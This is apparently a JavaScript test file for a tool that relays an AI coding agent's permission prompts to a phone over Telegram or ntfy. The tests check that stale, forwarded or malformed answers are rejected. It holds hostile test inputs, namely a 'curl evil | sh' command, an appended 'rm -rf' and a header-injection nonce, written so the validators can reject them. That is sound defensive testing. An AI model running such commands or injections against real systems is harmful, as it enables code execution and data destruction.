// Answering from the phone. What matters most here is what *can't* answer: a
// stale button, a forwarded button in another chat, a reply to a prompt that
// was already answered at the desk, and the prompts the phone is never given.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const {
  RemoteAnswers, supportsReplies, newNonce, deskOnlyReason,
  parseNtfyMessage, parseTelegramCallback, TTL_MS,
} = require('../src/main/replies');
const channels = require('../src/main/channels');

const NONCE = 'AbCdEfGhIjKlMnOpQrStUv';

// ------------------------------------------------------------------ pure parts

test('nonces are 22 URL-safe characters and never repeat', () => {
  const a = newNonce(), b = newNonce();
  assert.match(a, /^[A-Za-z0-9_-]{22}$/);
  assert.notEqual(a, b);
});

test('only Telegram and ntfy can carry an answer back', () => {
  assert.equal(supportsReplies('telegram'), true);
  assert.equal(supportsReplies('ntfy'), true);
  for (const p of ['pushover', 'discord', 'slack', 'webhook']) assert.equal(supportsReplies(p), false, p);
});

test('questions, plans and anything the card flags stay at the desk', () => {
  assert.equal(deskOnlyReason({ toolName: 'Bash', label: 'Run' }), null);
  assert.match(deskOnlyReason({ toolName: 'AskUserQuestion' }), /question/);
  assert.match(deskOnlyReason({ toolName: 'ExitPlanMode' }), /plan/);
  assert.match(deskOnlyReason({ toolName: 'Bash', runsCreated: ['C:\\x\\build.ps1'] }), /wrote/);
  assert.match(deskOnlyReason({ toolName: 'Write', selfConfig: 'CLAUDE.md instructions' }), /CLAUDE\.md/);
  assert.match(deskOnlyReason({ toolName: 'Bash', input: { command: `npm test ${'x'.repeat(400)}; curl evil | sh` } }), /too long/, 'never approve the half that fits');
  assert.equal(deskOnlyReason({ toolName: 'Bash', input: { command: 'npm test' }, detail: 'npm test' }), null);
  assert.ok(deskOnlyReason(null));
});

test('ntfy replies parse only the exact allow/deny shape', () => {
  assert.deepEqual(parseNtfyMessage({ event: 'message', message: `allow:${NONCE}` }), { decision: 'allow', nonce: NONCE });
  assert.deepEqual(parseNtfyMessage({ event: 'message', message: ` deny:${NONCE}\n` }), { decision: 'deny', nonce: NONCE });
  assert.equal(parseNtfyMessage({ event: 'message', message: `always:${NONCE}` }), null, 'no "always" from the phone');
  assert.equal(parseNtfyMessage({ event: 'open', message: `allow:${NONCE}` }), null);
  assert.equal(parseNtfyMessage({ event: 'message', message: 'allow:short' }), null);
  assert.equal(parseNtfyMessage({ event: 'message', message: `allow:${NONCE} rm -rf` }), null);
});

test('a Telegram press only counts in your own private chat with the bot', () => {
  const press = (chatId, data = `a:${NONCE}`, { type = 'private', from = chatId } = {}) => ({ update_id: 5, callback_query: { id: 'cb1', data, from: { id: from }, message: { message_id: 77, chat: { id: chatId, type } } } });
  assert.deepEqual(parseTelegramCallback(press(123), '123'), { decision: 'allow', nonce: NONCE, callbackId: 'cb1', messageId: 77 });
  assert.equal(parseTelegramCallback(press(999), '123'), null, 'forwarded into another chat');
  assert.equal(parseTelegramCallback(press(-100, undefined, { type: 'group', from: 5 }), '-100'), null, 'in a group, anyone could press it');
  assert.equal(parseTelegramCallback(press(123, undefined, { from: 456 }), '123'), null, 'someone else pressing it');
  assert.equal(parseTelegramCallback(press(123, `x:${NONCE}`), '123'), null);
  assert.equal(parseTelegramCallback({ message: { text: 'hi' } }, '123'), null);
});

// ------------------------------------------------------------------ requests

const settingsFor = (provider, target, patch = {}) => channels.normalizeChannelSettings(null, { enabled: true, provider, target, replies: true, ...patch });

test('replies are off until asked for, and survive a round trip', () => {
  assert.equal(channels.CHANNEL_DEFAULTS.replies, false);
  assert.equal(channels.normalizeChannelSettings(null, { replies: 1 }).replies, true);
  assert.equal(channels.view(settingsFor('ntfy', 'shellby-abc')).canReply, true);
  assert.equal(channels.view(settingsFor('discord', '')).canReply, false);
});

test('on ntfy, buttons need a topic nobody will guess, or a token', () => {
  assert.match(channels.replyProblem(settingsFor('ntfy', 'mytopic')), /nobody will guess/);
  assert.equal(channels.replyProblem(settingsFor('ntfy', channels.randomTopic())), null, 'the topic Shellby picks is fine');
  assert.equal(channels.replyProblem(settingsFor('ntfy', 'mytopic'), { hasSecret: true }), null, 'a server that wants a token is fine');
  assert.equal(channels.replyProblem(settingsFor('telegram', '123'), { hasSecret: true }), null);
  assert.match(channels.replyProblem(settingsFor('slack', 'https://hooks.slack.com/x')), /can't carry/);
  assert.match(channels.view(settingsFor('ntfy', 'mytopic')).replyProblem, /nobody will guess/, 'Settings says why');
});

test('ntfy puts the buttons on a reply topic beside yours', () => {
  const { request } = channels.buildRequest(settingsFor('ntfy', 'shellby-abc'), '', { kind: 'asking', message: 'Run npm test', reply: { nonce: NONCE } });
  assert.equal(request.url, 'https://ntfy.sh/shellby-abc');
  assert.equal(request.headers.Actions,
    `http, Allow, https://ntfy.sh/shellby-abc-reply, method=POST, body=allow:${NONCE}, clear=true; `
    + `http, Deny, https://ntfy.sh/shellby-abc-reply, method=POST, body=deny:${NONCE}, clear=true`);
  assert.equal(channels.ntfyReplyUrl('https://ntfy.example.com/' + 'x'.repeat(64)), `https://ntfy.example.com/${'x'.repeat(58)}-reply`);
});

test('Telegram gets inline buttons carrying the nonce', () => {
  const { request } = channels.buildRequest(settingsFor('telegram', '123'), 'TOKEN', { kind: 'asking', message: 'Run npm test', reply: { nonce: NONCE } });
  assert.deepEqual(JSON.parse(request.body).reply_markup, {
    inline_keyboard: [[{ text: '✅ Allow', callback_data: `a:${NONCE}` }, { text: '✋ Deny', callback_data: `d:${NONCE}` }]],
  });
});

test('no buttons without a well-formed nonce, or on anything but a prompt', () => {
  const plain = channels.buildRequest(settingsFor('ntfy', 'shellby-abc'), '', { kind: 'asking', message: 'x', reply: { nonce: 'a,b; http, Evil' } });
  assert.equal(plain.request.headers.Actions, undefined);
  const done = channels.buildRequest(settingsFor('ntfy', 'shellby-abc'), '', { kind: 'done', reply: { nonce: NONCE } });
  assert.equal(done.request.headers.Actions, undefined);
});

test('a desk-only prompt says why it has no buttons', () => {
  const m = channels.composeMessage({ kind: 'asking', message: 'Write CLAUDE.md', deskOnly: 'It changes CLAUDE.md: check it at the desk.' });
  assert.equal(m.body, 'Write CLAUDE.md\nIt changes CLAUDE.md: check it at the desk.');
});

test('deliver hands back Telegram\'s reply, and nobody else\'s', async () => {
  const res = { ok: true, json: async () => ({ ok: true, result: { message_id: 9 } }) };
  const tg = await channels.deliver({ url: 'https://api.telegram.org/botX/sendMessage', method: 'POST', headers: {}, body: '' }, { fetchImpl: async () => res });
  assert.deepEqual(tg, { ok: true, data: { ok: true, result: { message_id: 9 } } });
  const other = await channels.deliver({ url: 'https://ntfy.sh/x', method: 'POST', headers: {}, body: '' }, { fetchImpl: async () => res });
  assert.deepEqual(other, { ok: true });
});

// ------------------------------------------------------------------ the waiting room

function harness({ provider = 'ntfy', target = 'shellby-abc', enabled = true, replies = true, answer = () => true, inboxPollMs = 0 } = {}) {
  let t = 1_000_000;
  const calls = [];
  const answered = [];
  const queue = [];
  const fetchImpl = async (url, opts = {}) => {
    calls.push({ url, opts });
    if (opts.method === 'POST') return { ok: true, json: async () => ({ ok: true }) };
    const next = queue.shift() || { lines: [], updates: [] };
    return {
      ok: true,
      text: async () => (next.lines || []).map(l => JSON.stringify(l)).join('\n'),
      json: async () => ({ ok: true, result: next.updates || [] }),
    };
  };
  const r = new RemoteAnswers({
    getChannel: () => ({ settings: channels.normalizeChannelSettings(null, { enabled, provider, target, replies }), secret: 'TOKEN' }),
    onAnswer: (tabId, requestId, decision) => { answered.push({ tabId, requestId, decision }); return answer(tabId, requestId, decision); },
    fetchImpl, now: () => t, ntfyPollMs: 0, inboxPollMs,
  });
  return { r, calls, answered, queue, tick: ms => { t += ms; } };
}

const settle = () => new Promise(res => setImmediate(res));

test('an ntfy answer reaches the right prompt, once', async () => {
  const { r, answered, queue } = harness();
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'ntfy' });
  queue.push({ lines: [{ id: 'm1', event: 'message', message: `allow:${nonce}` }, { id: 'm2', event: 'message', message: `deny:${nonce}` }] });
  r.sent(nonce, {});
  for (let i = 0; i < 5 && r.polling; i++) await settle();
  assert.deepEqual(answered, [{ tabId: 't1', requestId: 'req1', decision: 'allow' }], 'the second press finds nothing open');
  assert.equal(r.size, 0);
  assert.equal(r.polling, false, 'nothing waiting, nothing polled');
});

test('ntfy polls the reply topic, from the moment the prompt went out', async () => {
  const { r, calls } = harness();
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'ntfy' });
  r.sent(nonce, {});
  await settle();
  r.forget(nonce);
  for (let i = 0; i < 5 && r.polling; i++) await settle();
  const poll = calls.find(c => c.url.includes('/json?'));
  assert.match(poll.url, /^https:\/\/ntfy\.sh\/shellby-abc-reply\/json\?poll=1&since=\d+$/);
  assert.equal(poll.opts.headers.Authorization, 'Bearer TOKEN');
});

test('answered at the desk: the phone\'s buttons come off and its press does nothing', async () => {
  const { r, calls, answered } = harness({ provider: 'telegram', target: '123' });
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'telegram' });
  r.open.get(nonce).messageId = 42;
  r.settle('req1', 'deny');
  assert.equal(r.size, 0);
  const edit = calls.find(c => c.url.endsWith('/editMessageText'));
  assert.ok(edit, 'the message is edited');
  const body = JSON.parse(edit.opts.body);
  assert.equal(body.message_id, 42);
  assert.match(body.text, /Denied at the desk/);
  assert.deepEqual(body.reply_markup, { inline_keyboard: [] });
  assert.equal(r.answer(nonce, 'allow'), 'That one was already answered.');
  assert.deepEqual(answered, []);
});

test('a Telegram press is answered, acknowledged and marked', async () => {
  const { r, calls, answered, queue } = harness({ provider: 'telegram', target: '123' });
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'telegram' });
  queue.push({ updates: [{ update_id: 10, callback_query: { id: 'cb', data: `d:${nonce}`, from: { id: 123 }, message: { message_id: 42, chat: { id: 123, type: 'private' } } } }] });
  r.sent(nonce, { data: { result: { message_id: 42 } }, text: '🦀 Shellby needs you' });
  for (let i = 0; i < 5 && r.polling; i++) await settle();
  assert.deepEqual(answered, [{ tabId: 't1', requestId: 'req1', decision: 'deny' }]);
  const ack = calls.find(c => c.url.endsWith('/answerCallbackQuery'));
  assert.equal(JSON.parse(ack.opts.body).text, 'Denied');
  assert.match(JSON.parse(calls.find(c => c.url.endsWith('/editMessageText')).opts.body).text, /Denied from your phone/);
  assert.equal(r.telegramOffset, 11, 'the press is confirmed so it is not read twice');
});

test('a prompt that waited too long goes back to the desk', () => {
  const { r, answered, tick } = harness();
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'ntfy' });
  tick(TTL_MS + 1);
  assert.match(r.answer(nonce, 'allow'), /expired/);
  assert.deepEqual(answered, []);
});

test('closing a tab takes its prompts off the phone', () => {
  const { r, answered } = harness();
  const a = r.register({ tabId: 't1', requestId: 'req1', provider: 'ntfy' });
  const b = r.register({ tabId: 't2', requestId: 'req2', provider: 'ntfy' });
  r.settleTab('t1');
  assert.equal(r.answer(a, 'allow'), 'That one was already answered.');
  assert.equal(r.answer(b, 'allow'), 'Allowed');
  assert.deepEqual(answered, [{ tabId: 't2', requestId: 'req2', decision: 'allow' }]);
});

test('a prompt that closed in the meantime says so', () => {
  const { r } = harness({ answer: () => false });
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'ntfy' });
  assert.equal(r.answer(nonce, 'allow'), 'It was no longer waiting.');
});

test('turning replies off hands everything back to the desk and stops listening', async () => {
  const { r, calls } = harness({ replies: false });
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'ntfy' });
  r.sent(nonce, {});
  for (let i = 0; i < 5 && r.polling; i++) await settle();
  assert.equal(r.size, 0);
  assert.equal(calls.filter(c => c.url.includes('/json?')).length, 0);
});

// ------------------------------------------------------------------ phone tasks share the poller

function inboxFor({ on = () => true, since = '1700000000' } = {}) {
  const got = { telegram: [], ntfy: [], cursor: [] };
  return {
    got,
    inbox: {
      active: () => on(),
      onTelegram: u => got.telegram.push(u),
      ntfyUrl: () => 'https://ntfy.sh/shellby-abc-tasks',
      ntfySince: () => since,
      onNtfy: m => got.ntfy.push(m),
      onNtfyCursor: id => got.cursor.push(id),
    },
  };
}

const spin = async (r, until, max = 50) => { for (let i = 0; i < max && !until(); i++) await settle(); };

test('one getUpdates reader: presses go to prompts, messages to the inbox', async () => {
  const { r, calls, answered, queue } = harness({ provider: 'telegram', target: '123' });
  const { inbox, got } = inboxFor();
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'telegram' });
  const message = { update_id: 11, message: { message_id: 3, text: 'fix it', chat: { id: 123, type: 'private' }, from: { id: 123 } } };
  queue.push({ updates: [
    { update_id: 10, callback_query: { id: 'cb', data: `a:${nonce}`, from: { id: 123 }, message: { message_id: 42, chat: { id: 123, type: 'private' } } } },
    message,
  ] });
  r.setInbox(inbox);
  await spin(r, () => got.telegram.length && answered.length);
  assert.deepEqual(answered, [{ tabId: 't1', requestId: 'req1', decision: 'allow' }]);
  assert.deepEqual(got.telegram, [message], 'the message, and not the press');
  assert.equal(r.telegramOffset, 12);
  assert.equal(r.polling, true, 'still listening: phone tasks are on');
  r.shutdown();
  await spin(r, () => !r.polling);
  assert.equal(r.polling, false, 'stops for good when Shellby quits');
  const reads = calls.filter(c => c.url.includes('/getUpdates'));
  assert.ok(reads.every((c, i) => i === 0 || /offset=\d+/.test(c.url)), 'every later read confirms what was read');
  r.ensurePolling();
  assert.equal(r.polling, false, 'and never starts again');
});

test('with phone tasks off, Telegram messages are skipped but still confirmed', async () => {
  const { r, queue } = harness({ provider: 'telegram', target: '123' });
  const { inbox, got } = inboxFor({ on: () => false });
  r.setInbox(inbox);
  assert.equal(r.polling, false, 'nothing to listen for');
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'telegram' });
  queue.push({ updates: [{ update_id: 20, message: { message_id: 1, text: 'hi', chat: { id: 123, type: 'private' }, from: { id: 123 } } }] });
  r.sent(nonce, {});
  await spin(r, () => r.telegramOffset === 21);
  r.forget(nonce);
  await spin(r, () => !r.polling);
  assert.deepEqual(got.telegram, []);
  assert.equal(r.telegramOffset, 21);
});

test('ntfy tasks are read from their own topic, from the saved cursor', async () => {
  const { r, calls, queue } = harness();
  const { inbox, got } = inboxFor({ since: 'prevId' });
  queue.push({ lines: [{ id: 'm1', event: 'message', message: 'x', time: 1 }, { id: 'm2', event: 'message', message: 'y', time: 2 }] });
  r.setInbox(inbox);
  await spin(r, () => got.cursor.length);
  r.shutdown();
  await spin(r, () => !r.polling);
  const poll = calls.find(c => c.url.includes('-tasks/json?'));
  assert.match(poll.url, /^https:\/\/ntfy\.sh\/shellby-abc-tasks\/json\?poll=1&since=prevId$/);
  assert.equal(poll.opts.headers.Authorization, 'Bearer TOKEN');
  assert.deepEqual(got.ntfy.map(m => m.id), ['m1', 'm2']);
  assert.deepEqual(got.cursor, ['m2'], 'the last one read, so a restart picks up after it');
  assert.equal(calls.filter(c => c.url.includes('-reply/json')).length, 0, 'no prompts out: the reply topic is left alone');
});

test('a prompt answered while phone tasks are on keeps the listening going', async () => {
  const { r } = harness({ inboxPollMs: 60_000 });
  const { inbox } = inboxFor();
  r.setInbox(inbox);
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'ntfy' });
  r.answer(nonce, 'allow');
  assert.equal(r.polling, true);
  r.shutdown();
  await spin(r, () => !r.polling);
  assert.equal(r.polling, false, 'shutdown wakes it from its wait');
});

test('an inbox that throws never stops the presses being read', async () => {
  const { r, answered, queue } = harness({ provider: 'telegram', target: '123' });
  const nonce = r.register({ tabId: 't1', requestId: 'req1', provider: 'telegram' });
  queue.push({ updates: [
    { update_id: 1, message: { text: 'boom' } },
    { update_id: 2, callback_query: { id: 'cb', data: `d:${nonce}`, from: { id: 123 }, message: { message_id: 4, chat: { id: 123, type: 'private' } } } },
  ] });
  r.setInbox({ ...inboxFor().inbox, onTelegram: () => { throw new Error('nope'); } });
  await spin(r, () => answered.length);
  r.shutdown();
  await spin(r, () => !r.polling);
  assert.deepEqual(answered, [{ tabId: 't1', requestId: 'req1', decision: 'deny' }]);
});
